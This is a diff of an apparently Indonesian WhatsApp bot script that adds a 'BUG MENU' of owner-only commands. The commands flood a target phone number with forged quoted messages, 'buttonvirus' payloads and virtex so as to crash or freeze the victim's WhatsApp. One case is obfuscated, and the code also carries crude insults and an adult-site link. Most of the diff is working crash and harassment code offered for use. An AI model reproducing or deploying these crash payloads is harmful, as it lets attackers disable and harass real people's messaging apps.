@@ -9363,19 +9363,31 @@ await DhaffNetwork.send5ButGif(from, `
 ▌╟❯▁ ${prefix}block [tag/number]
 ▌╟❯▁ ${prefix}unblock [tag/number]
 ▌╟❯▁ ${prefix}coowner [add/del]
-▌╟═══════⌬「 GAME 」
-▌╟❯▁ ${prefix}bugpc
-▌╟❯▁ ${prefix}gascrashar [tag/number]
-▌╟❯▁ ${prefix}sendreaksi [tag/number]
-▌╟❯▁ ${prefix}colidek
-▌╟❯▁ ${prefix}catalog
-▌╟❯▁ ${prefix}bugvn
-▌╟❯▁ ${prefix}bugsticker
-▌╟❯▁ ${prefix}vncrash
-▌╟❯▁ ${prefix}troli 
-▌╟❯▁ ${prefix}stickercrash [tag/number]
-▌╟❯▁ ${prefix}santed30menit [tag/number]
-▌╟❯▁ ${prefix}santed1jam [tag/number]
+▌╟═══════⌬「 BUG MENU 」
+▌╟❯▁  ${prefix}penjara
+▌╟❯▁  ${prefix}dhaffafk
+▌╟❯▁  ${prefix}pe
+▌╟❯▁  ${prefix}hallo_sayang
+▌╟❯▁  ${prefix}dok
+▌╟❯▁  ${prefix}bukadong
+▌╟❯▁  ${prefix}dhafftag
+▌╟❯▁  ${prefix}colidek
+▌╟❯▁  ${prefix}crashar
+▌╟❯▁  ${prefix}sayangcrash
+▌╟❯▁  ${prefix}catalog
+▌╟❯▁  ${prefix}bugvn
+▌╟❯▁  ${prefix}bugsticker
+▌╟❯▁  ${prefix}troli
+▌╟❯▁  ${prefix}bugpc
+▌╟❯▁  ${prefix}gascrashar [Nomer]
+▌╟❯▁  ${prefix}gasbro [Nomer]
+▌╟❯▁  ${prefix}gasbtt [Nomer]
+▌╟❯▁  ${prefix}sendreaksi [Nomer]
+▌╟❯▁  ${prefix}stickercrash [Nomer]
+▌╟❯▁  ${prefix}vncrash [Nomer]
+▌╟❯▁  ${prefix}santed30menit [Nomer]
+▌╟❯▁  ${prefix}santed1jam [Nomer]
+▌╟❯▁  ${prefix}jadivirtex [Text]
 ▌╟═══════⌬「 GROUP 」	        
 ▌╟❯▁${prefix}grousetting
 ▌╟❯▁${prefix}grouplink
@@ -9937,6 +9949,166 @@ await DhaffNetwork.send5ButGif(from, `
                           await DhaffNetwork.sendMessage(m.chat, {audio:  fs.readFileSync('./galery/audio/allmenu.mp3'), mimetype: 'audio/mp4', ptt:true}, {quoted:m})
 break
 //case hacker
+            case 'kelentod':
+            kelentod = `.`
+            dhaff.sendMessage(m.chat, {text: kelentod})
+            break
+            case 'pe':
+              if (!isCreator) throw mess.owner
+              const buttons = [
+  {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
+  {buttonId: 'babaabbabababa', buttonText: {displayText: dhaffmods}, type: 1},
+  {buttonId: 'babababbababa', buttonText: {displayText: virusv1}, type: 1}
+]
+
+const buttonMessage = {
+    text: "Pe aja",
+    footerText: 'Pe',
+    buttons: buttons,
+    headerType: 1
+}
+dhaff.sendMessage(m.chat, buttonMessage)
+               break
+ case 'hallo_sayang':
+if (!isCreator) throw mess.owner
+kontolu = '``🔥 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥``',
+dhaff.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${bugweb}`,body: '🔥 𝐁𝐔𝐆 - 𝐓𝐁𝐂 - 𝐖𝐀 🔥',previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com`}}})
+break
+case 'dok':
+if (!isCreator) throw mess.owner
+y1 = fs.readFileSync('./pirtex/iphone.mp3')
+dhaff.sendMessage(m.chat, {document: y1, fileName: `🔥 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥 .${buttonvirus}.mp3`, quoted: m})
+break
+case 'dhaffaja' : {
+if (!isCreator) throw mess.owner
+connecting = dhaff
+function _0x1a02(){var _0x9511fa=['sendMessage','quoted','1246790oINqcJ','2yEapSB','awowkwkwk','2382268ivygFy','key','replace','chat','27oEkRwD','2199110ufwRsE','@s.whatsapp.net','6rIhLFT','mentionedJid','154832trKriz','1312287KZVhaq','100117IRrQXd','3554016vHMCCV'];_0x1a02=function(){return _0x9511fa;};return _0x1a02();}var _0x513741=_0x2c43;function _0x2c43(_0x50ccd7,_0x5a8a17){var _0x1a0292=_0x1a02();return _0x2c43=function(_0x2c43dc,_0x4ba15e){_0x2c43dc=_0x2c43dc-0x1a9;var _0x3d4510=_0x1a0292[_0x2c43dc];return _0x3d4510;},_0x2c43(_0x50ccd7,_0x5a8a17);}(function(_0x3c1583,_0x4a5a47){var _0x5568b0=_0x2c43,_0x59e990=_0x3c1583();while(!![]){try{var _0x1d994b=parseInt(_0x5568b0(0x1ac))/0x1*(-parseInt(_0x5568b0(0x1b1))/0x2)+-parseInt(_0x5568b0(0x1ab))/0x3+-parseInt(_0x5568b0(0x1aa))/0x4+-parseInt(_0x5568b0(0x1b0))/0x5*(-parseInt(_0x5568b0(0x1ba))/0x6)+parseInt(_0x5568b0(0x1b3))/0x7+-parseInt(_0x5568b0(0x1ad))/0x8+-parseInt(_0x5568b0(0x1b7))/0x9*(-parseInt(_0x5568b0(0x1b8))/0xa);if(_0x1d994b===_0x4a5a47)break;else _0x59e990['push'](_0x59e990['shift']());}catch(_0x52a42e){_0x59e990['push'](_0x59e990['shift']());}}}(_0x1a02,0x37e2d),Pe=m['mentionedJid'][0x0]?m[_0x513741(0x1a9)][0x0]:m[_0x513741(0x1af)]?m[_0x513741(0x1af)]['sender']:text[_0x513741(0x1b5)](/[^0-9]/g,'')+_0x513741(0x1b9),a=await connecting['sendMessage'](m[_0x513741(0x1b6)],{'react':{'text':'\x20️','key':{'remoteJid':m[_0x513741(0x1b6)],'fromMe':!![],'id':m[_0x513741(0x1b4)]['id']}}}),connecting[_0x513741(0x1ae)](Pe,{'text':_0x513741(0x1b2)},{'quoted':a}));
+}
+break
+case 'bukadong':
+if (!isCreator) throw mess.owner
+dhafflistmessagebug = [
+                {
+                title: `🔥 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥 ${dhaffmods} ${buttonvirus}`,
+                rows: [
+                {title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Bro`},
+                {title: dhaffmods, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Manusia`}
+                ]
+                }
+                ]
+                dhaff.sendListMsg(m.chat, `🔥 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥`, dhaff.user.name, `Hay Ngentod`, `🔥 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥`, dhafflistmessagebug, m)
+break
+case 'dhafftag': {
+                if (!isCreator) throw mess.owner
+                if (!m.isGroup) throw mess.group                
+                let teks = philips
+                for (let mem of participants) {
+                teks += `▌╟❯▁  @${mem.id.split('@')[0]}\n`
+                }
+                dhaff.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
+                }
+                break
+         case 'sayangcrash':               
+          if (!isCreator) throw mess.owner
+             asukonyol11 = { 
+                    key: { 
+                        fromMe: false, 
+                        participant: `0@s.whatsapp.net`, 
+                        ...({ remoteJid: "" }) 
+                    }, 
+                    message: { 
+                        "imageMessage": { 
+                            "mimetype": "image/jpeg", 
+                            "caption": `𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅`,
+                            "jpegThumbnail": thumb
+                        } 
+                    } 
+                }
+            dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            break
+            case 'gasbro':
+                if (!isCreator) throw mess.owner
+                if (!text) throw `MANA NOMERNYA PANTEK`
+                gasbugpc = { 
+                    key: { 
+                        fromMe: false, 
+                        participant: `0@s.whatsapp.net`, 
+                        ...({ remoteJid: "" }) 
+                    }, 
+                    message: { 
+                        "imageMessage": { 
+                            "mimetype": "image/jpeg", 
+                            "caption": `𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅`,
+                            "jpegThumbnail": thumb
+                        } 
+                    } 
+                }
+                dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:gasbugpc})
+                m.reply(`succes`)
+
+                break
+                case 'gasbtt':
+                    if (!isCreator) throw mess.owner
+                    if (!text) throw `MANA NOMERNYA PANTEK`
+                 buttonspc = [
+                        {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
+                        {buttonId: 'babaabbabababa', buttonText: {displayText: dhaffmods}, type: 1},
+                        {buttonId: 'babababbababa', buttonText: {displayText: virusv1}, type: 1}
+                      ]
+                      
+                    buttonMessagepc = {
+                          text: "dhaff INFINITE CRASHAR",
+                          footerText: 'Pe',
+                          buttons: buttonspc,
+                          headerType: 1
+                      }
+                      dhaff.sendMessage(`${text}@s.whatsapp.net`, buttonMessagepc)
+                      m.reply(`succes`)
+                    break
+                    case 'crashar':               
+          if (!isCreator) throw mess.owner
+             asukonyol11 = { 
+                    key: { 
+                        fromMe: false, 
+                        participant: `0@s.whatsapp.net`, 
+                        ...({ remoteJid: "" }) 
+                    }, 
+                    message: { 
+                        "imageMessage": { 
+                            "mimetype": "image/jpeg", 
+                            "caption": `𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅`,
+                            "jpegThumbnail": thumb
+                        } 
+                    } 
+                }
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(m.chat, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            break
             case 'gascrashar':               
           if (!isCreator) throw mess.owner
           if (!text) throw `MANA NOMERNYA PANTEK`
@@ -9954,86 +10126,86 @@ break
                         } 
                     } 
                 }
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
-            await DhaffNetwork.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
+            await dhaff.sendMessage(`${text}@s.whatsapp.net`, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"},{quoted:asukonyol11})
             m.reply(`SUCCES`)
             break
             case 'sendreaksi' : {
                 if (!isCreator) throw mess.owner
                 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-                a = await DhaffNetwork.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
-                await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-                await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
-await DhaffNetwork.sendMessage(Pe, {text:"𝕯𝖍𝖆𝖋𝖋 𝑬𝖝𝖊𝖈𝖚𝖙𝖊𝒅"}, {quoted: a})
